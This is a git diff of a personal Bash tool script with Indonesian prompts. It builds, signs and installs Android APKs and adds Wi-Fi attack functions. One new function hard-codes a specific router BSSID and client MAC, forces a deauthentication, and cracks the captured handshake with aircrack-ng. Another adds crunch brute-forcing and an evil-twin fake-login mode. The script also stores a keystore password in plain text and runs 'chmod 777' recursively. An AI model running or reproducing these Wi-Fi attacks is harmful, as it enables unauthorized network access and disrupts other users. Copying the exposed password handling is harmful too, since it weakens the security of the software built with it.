@@ -22,7 +22,7 @@ path_apk_empeded="$HOME/oprek/smali"
 path_apk_backup="$HOME/Dokumen/android"
 lib_apk_backup="$allib/build-tools"
 default_apk_build="$allib/build-tools/main"
-ndk="/home/shun/Android/android-ndk-r10e"
+ndk="/home/setsuna/android-ndk-r20b" #DON'T use ~/bla
 #Distros vars
 known_compatible_distros=(
 							"Wifislax"
@@ -82,7 +82,7 @@ declare -A possible_package_names=(
 
 
 function last_echo() {
-        echo -e "${2}$*${normal_color}"
+	echo -e "${2}$*${normal_color}"
 }
 function echo_green() {
 	last_echo "${1}" "${green_color}"
@@ -145,62 +145,63 @@ function apk_vclass() {
 
 function apk_build()
 {
-        if [ $auto = "1" ]; then
-            export LIBPROJ=$allib/build-tools
-            anama=`cat $pauto/nama.txt`
-            apaket=`cat $pauto/paket.txt`
-            cd $LIBPROJ
-	    sudo chmod 777 -R $anama
-            if [ ! -d "$anama/obj" ]; then mkdir $anama/obj; fi
-	    if [ ! -d "$anama/bin" ]; then mkdir $anam/bin; fi
-            rlagi="y"
-            while [ $rlagi = "y" ];do
-               read -p "[+]  buat R? y/n: " R
-               if [ "$R" = "y" ]; then 
-	           echo_yellow  "[+]  Buat file R.java --->>"
-                   ./aapt package -f -m -J $anama/src -M $anama/AndroidManifest.xml -S $anama/res -I $LIBPROJ/android.jar
-                   echo
-	       else
-                   rlagi="n"
-               fi
-            done
+	if [ $auto = "1" ]; then
+		export LIBPROJ=$allib/build-tools
+		anama=`cat $pauto/nama.txt`
+		apaket=`cat $pauto/paket.txt`
+		cd $LIBPROJ
+		sudo chmod 777 -R $anama
+		if [ ! -d "$anama/obj" ]; then mkdir $anama/obj; fi
+		if [ ! -d "$anama/bin" ]; then mkdir $anam/bin; fi
 
-            cd $anama
+		rlagi="y"
+		while [ $rlagi = "y" ];do
+			read -p "[+]  buat R? y/n: " R
+			if [ "$R" = "y" ]; then 
+				echo_yellow  "[+]  Buat file R.java --->>"
+				./aapt package -f -m -J $anama/src -M $anama/AndroidManifest.xml -S $anama/res -I $LIBPROJ/android.jar
+				echo
+			else
+				rlagi="n"
+			fi
+		done
+		cd $anama
 
-            clagi="y"
-	    while [ $clagi = "y" ]; do
-        	read -p "[+]  compile y/n : " EPROJ
-		if [ "$EPROJ" = "y" ]; then
-		    echo_yellow "###################### `date` #######################"
-		    echo_green_title "Compiling..."
-      		    javac -d obj -classpath src -bootclasspath $LIBPROJ/android.jar src/$apaket/*.java
-		    echo_red "Finish compiling!"
-		    echo
-		else
-		    clagi="n"
+		clagi="y"
+		while [ $clagi = "y" ]; do
+			read -p "[+]  compile y/n : " EPROJ
+			if [ "$EPROJ" = "y" ]; then
+				echo_yellow "###################### `date` #######################"
+				echo_green_title "Compiling..."
+				javac -d obj -classpath src -bootclasspath $LIBPROJ/android.jar src/$apaket/*.java
+				echo_red "Finish compiling!"
+				echo
+			else
+				clagi="n"
+			fi
+		done
+	
+		cd $LIBPROJ
+		echo
+		echo_blue "[+]  Dexing -->> ";./dx --dex --output=$anama/bin/classes.dex $anama/obj >/dev/null
+		echo_yellow "[+]  Build apk -->> ";./aapt package -f -m -F $anama/bin/out.apk -A $anama/assets -M $anama/AndroidManifest.xml -S $anama/res -I $LIBPROJ/android.jar >/dev/null
+		cp $anama/bin/classes.dex .
+		./aapt add $anama/bin/out.apk classes.dex  >/dev/null
+		./aapt list $anama/bin/out.apk  >/dev/null
+
+		if [ -d $anama/jni ]; then
+			echo "[+]  Sample add lib: aapt add bin/out.apk lib/armeabi/lib.so lalu sign ulang"
 		fi
-	    done
-            cd $LIBPROJ
-            echo
-	    echo_blue "[+]  Dexing -->> ";./dx --dex --output=$anama/bin/classes.dex $anama/obj >/dev/null
-	    echo_yellow "[+]  Build apk -->> ";./aapt package -f -m -F $anama/bin/out.apk -A $anama/assets -M $anama/AndroidManifest.xml -S $anama/res -I $LIBPROJ/android.jar >/dev/null
-	    cp $anama/bin/classes.dex .
-	    ./aapt add $anama/bin/out.apk classes.dex  >/dev/null
-	    ./aapt list $anama/bin/out.apk  >/dev/null
-
-	    if [ -d $anama/jni ]; then
-               echo "[+]  Sample add lib: aapt add bin/out.apk lib/armeabi/lib.so lalu sign ulang"
-	    fi
-	    echo_green  "[+]  Signing apk -->>"; jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $anama/bin/out.apk mykey  >/dev/null
-	    echo ""
-            anama=""
-            apaket=""
-            apk_build
-        else
-	    read -p "[+]  compile/baru? c/b: " bapk
-	    read -p "[+]  Pakai lib external? y/n: " libapk
-	    lagi="y"
-	    while [ "$lagi" = "y" ]; do
+		echo_green  "[+]  Signing apk -->>"; jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $anama/bin/out.apk mykey  >/dev/null
+		echo ""
+		anama=""
+		apaket=""
+		apk_build
+	else
+		read -p "[+]  compile/baru? c/b: " bapk
+		read -p "[+]  Pakai lib external? y/n: " libapk
+		lagi="y"
+		while [ "$lagi" = "y" ]; do
 		if [ "$bapk" = "b" ]; then
 			ls; read -p "[+] Nama project BUKAN STRING : " nbapk
 			if [ "`find $nbapk/AndroidManifest.xml`" != "" ]; then
@@ -213,10 +214,10 @@ function apk_build()
 			mkdir obj; mkdir bin; mkdir -p res/layout
 			mkdir res/values; mkdir res/drawable
 
-                        read -p "[+]  Build C ndk code? y/n: " bndk
+			read -p "[+]  Build C ndk code? y/n: " bndk
 			if [ "$bndk" = "y" ]; then
 				mkdir lib
-                                cp -r $default_apk_build/jni `pwd`
+				cp -r $default_apk_build/jni `pwd`
 			fi
 			cat $default_apk_build/AndroidManifest.xml > AndroidManifest.xml
 			cat $default_apk_build/MainActivity.java > src/$pbapk/MainActivity.java
@@ -286,21 +287,25 @@ function apk_build()
 				fi
 			done
 
-            cclagi="y"
-            while [ $cclagi = "y" ]; do
-                if [ -d jni ]; then
-                    read -p "[+]  jni compile y/n: " jnicompile
-                else
-                    cclagi="n"
-                fi
-                if [ "$jnicompile" = "y" ]; then
-                    $ndk/ndk-build
-                    mv libs/* lib
-                    rm -r libs
-                else
-                    cclagi="n"
-                fi
-            done
+			cclagi="y"
+			while [ $cclagi = "y" ]; do
+				if [ -d jni ]; then
+					read -p "[+]  jni compile y/n: " jnicompile
+				else
+					cclagi="n"
+				fi
+				if [ "$jnicompile" = "y" ]; then
+					$ndk/ndk-build
+					if [ ! -d lib ]; then
+						mkdir lib
+					fi
+					rm -R lib/*
+					mv libs/* lib
+					rm -r libs
+				else
+					cclagi="n"
+				fi
+			done
 
 			cd $LIBPROJ
 			echo
@@ -311,7 +316,15 @@ function apk_build()
 			./aapt list $PROJ/bin/out.apk  >/dev/null
 
 			if [ -d $PROJ/jni ]; then
-				echo "[+]  Sample add lib: aapt add bin/out.apk lib/armeabi/lib.so lalu sign ulang"
+				cd $PROJ
+				files=( lib/* )
+				for file in "${files[@]}"; do
+					pjni="`printf $file`"
+					ejni="`ls $file`"
+					ejni=$pjni/$ejni
+					aapt add bin/out.apk $ejni
+				done
+				cd -
 			fi
 			echo_green  "[+]  Signing apk -->>"; jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $PROJ/bin/out.apk mykey  >/dev/null
 			
@@ -326,15 +339,18 @@ function apk_build()
 				done
 				echo ""
 				read -p "[+]  masukan paket (com.sample) : " tpbapk
-				#adb uninstall "$tpbapk"; sleep 3; echo "[+] uninstall sukses"
+				read -p "[+]  masukan activity (MainActivity): " tabapk
+				echo_red "[+]  uninstall"
+				adb uninstall "$tpbapk"
+				echo_red "[+]  install"
 				adb install "$PROJ/bin/out.apk"
-				echo "[+] open: adb shell am start -n com.cpu/com.cpu.MainAsisten"
+				adb shell am start -n $tpbapk/$tpbapk.$tabapk
 			fi
 		fi
 		cd "$aktif"
 		read -p "[+] Lagi? y/n : " lagi
-	    done
-        fi
+		done
+	fi
 }
 #untuk backup apk via usb adb am make
 function apk_backup()
@@ -621,16 +637,26 @@ function wifi() {
     nmcli connection modify alice 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
     nmcli connection up alice
 }
+
+function xwifi_hack()
+{
+	xterm -e airodump-ng -c 1 --bssid 7C:8B:CA:B1:2F:12 -w `pwd`/tplink wlp9s0mon &
+	read -p "ENTER untuk kill client: "
+	xterm -e aireplay-ng --deauth 5 -a 7C:8B:CA:B1:2F:12 -c 7C:D6:61:93:94:F4 --ignore-negative-one wlp9s0mon &
+	read -p "ENTER untuk cracking (Handsake harus dapat): "
+	aircrack-ng -w integer.txt -b 7C:8B:CA:B1:2F:12 tplink-01.cap
+}
 function wifi_hack()
 {
 	iwconfig
-	read -p "[+] interface Name ex wlan0: " wifin
-	read -p "[+] monitor? ENTER adalah mon0  : " wifimon
-	read -p "[+] evil/brute e/b? : " wif
+	read -p "[+] Interface Name ex wlan0: " wifin
+	read -p "[+] Monitor? ENTER adalah mon0: " wifimon
+	read -p "[+] Evil/brute e/b? : " wif
 	wifmon="mon0"
-	wifsave="$HOME/wifi"
+	wifsave="$HOME/Hack/wifi"
 	wiftmp="/tmp/wifihacking"
 	wifserver="$allib/fakelogin/tplink"
+
 	if [ "$wifimon" != "" ]; then
 		wifmon="$wifimon"
 	fi
@@ -641,8 +667,9 @@ function wifi_hack()
 		mkdir -p $wiftmp
 	fi
 
-	airmon-ng start "$wifin"
 	if [ "$wif" = "e" ]; then
+		airmon-ng start "$wifin"
+
 		buatfakedns & buatserver
 		fuser -n tcp -k 53 67 80 &
 		fuser -n udp -k 53 67 80
@@ -652,20 +679,39 @@ function wifi_hack()
 		read -p "[+] Nama Fake wifi : " wifen
 		read -p "[+] Nama BSSID     : " wifeb
 		echo "tunggu..."
+
 	elif [ "$wif" = "b" ];then
 		read -p "[+] online/offline? on/of : " wifb
+
 		if [ "$wifb" = "on" ]; then
-			xterm -title "cari informasi wifi" -e airodump-ng $wifmon -w $wiftmp/hand
-			cat $wiftmp/hand-01.csv
+			airmon-ng start "$wifin"
+			airodump-ng $wifmon
+
 			read -p "[+] MAC address: " wifbmac
 			read -p "[+] Nomor channel: " wifbch
-			xterm -bg "#000000" -fg "#00AA00" -title "handsake wifi brute online dump-save" -e airodump-ng -c "$wifbch" --bssid "$wifbmac" -w $wifbtmp/hand $wifmon &
-			xterm -bg "#000000" -fg "#FF00A4" -title "kill wifi brute online mdk3" -e mdk3 $wifmon d &
-			read -p "[+] ENTER JIKA DAPAT HANDSHAKENYA>>> "
-			killall xterm
-			echo "aircrack-ng -w $wifbw $wiftmp/*.cap &"
-			read -p "[+] ~ Nama Wordlist *.txt : " wifbw
-			xterm -e aircrack-ng -w ~/$wifbw -b $wifbmac $wiftmp/*.cap &
+
+			xterm -bg "#000000" -fg "#00AA00" -title "Satu client" -e airodump-ng -c "$wifbch" --bssid "$wifbmac" -w $wiftmp/hand $wifmon &
+			read -p "[+] ENTER untuk kill client: "
+			xterm -bg "#000000" -fg "#FF00A4" -title "Kill" -e aireplay-ng --deauth 5 -a "$wifbmac" --ignore-negative-one $wifmon &
+
+			read -p "[+] ENTER untuk cracking (handsake harus dapat): "
+
+			read -p "[+] Punya Wordlist? y/n: " wifbwp
+			if [ "$wifbwp" = "n" ]; then
+				echo
+				echo_pink "*** Jangan ada spasi ****"
+				echo_blue "**** ini menggunakan kombinasi crunch dan aircrack-ng ****"
+				read -p "[+] Panjang pertama: " pertama
+				read -p "[+] Panjang terakhir: " terakhir
+				read -p "[+] Kombi Huruf: " huruf
+				read -p "[+] Nama Wifi: " namawifi
+
+				crunch $pertama $terakhir $huruf --stdout | aircrack-ng -w- $wiftmp/*.cap -e $namawifi
+			else
+				ls
+				read -p "[+] ~ Nama file Wordlist word.lst: " wifbw
+				aircrack-ng -w $wifbw -b $wifbmac $wiftmp/*.cap
+			fi
 
 			read -p "[+] simpan handshakes? y/n : " wifbs
 			if [ "$wifbs" = "y" ]; then
@@ -676,14 +722,30 @@ function wifi_hack()
 				echo "[+] remove all handsake"
 				rm $wiftmp/*
 			fi
+
 		elif [ "$wifb" = "of" ]; then
-			read -p "[+] ~ Nama Wordlist *.txt : " wifbw
-			ls $wifsave
-			read -p "[+] Nama wifi : " wifbh
-			echo "aircrack-ng -w $wifbw $wiftmp/*.cap &"
-			cd; aircrack-ng -w $wifbw $wifsave/$wifbh/*.cap &
+			read -p "[+] Punya Wordlist? y/n: " wifbwp
+			if [ "$wifbwp" = "n" ]; then
+				echo
+				echo_pink "*** Jangan ada spasi ****"
+				echo_blue "**** ini menggunakan kombinasi crunch dan aircrack-ng ****"
+				read -p "[+] Panjang pertama: " pertama
+				read -p "[+] Panjang terakhir: " terakhir
+				read -p "[+] Kombi Huruf: " huruf
+				read -p "[+] Nama ESSID Wifi: " namawifi
+
+				ls $wifsave
+				read -p "[+] Nama handsake wifi : " wifbh
+				crunch $pertama $terakhir $huruf --stdout | aircrack-ng -w- $wifsave/$wifbh/*.cap -e $namawifi
+			else
+				ls
+				read -p "[+] ~ Nama Wordlist *.txt : " wifbw
+				ls $wifsave
+				read -p "[+] Nama wifi : " wifbh
+				aircrack-ng -w $wifbw $wifsave/$wifbh/*.cap
+			fi
 		else
-			echo "wifi input error"
+			echo "Wifi input error"
 		fi
 	fi
 }
@@ -844,7 +906,7 @@ elif [ "$com" = "git" ]; then
 elif [ "$com" = "cerah" ]; then
 	cerah
 elif [ "$com" = "edit" ]; then
-	cd $allib/sublime
+	cd $allib/sublime/62bit
 	./sublime_text 2>/dev/null &
 elif [ "$com" = "3d" ]; then
 	cd $allib/blender-2.75a-linux-glibc211-i686/
@@ -862,6 +924,9 @@ elif [ "$com" = "install" ]; then
 	install_data
 elif [ "$com" = "screen" ]; then
 	scrot ~/screen.jpeg
+elif [ "$com" = "seven-square" ]; then
+	cd $allib/build-tools
+	./seven-square
 else
 	echo
 	echo_green_title "    DAFTAR PERINTAH"
@@ -877,5 +942,6 @@ else
 	echo_yellow "wifi_hack: mengetes wifi"
 	echo_yellow "install: jika ini program diinstall dikomputer baru jalankan perintah ini"
 	echo
+
 fi
 
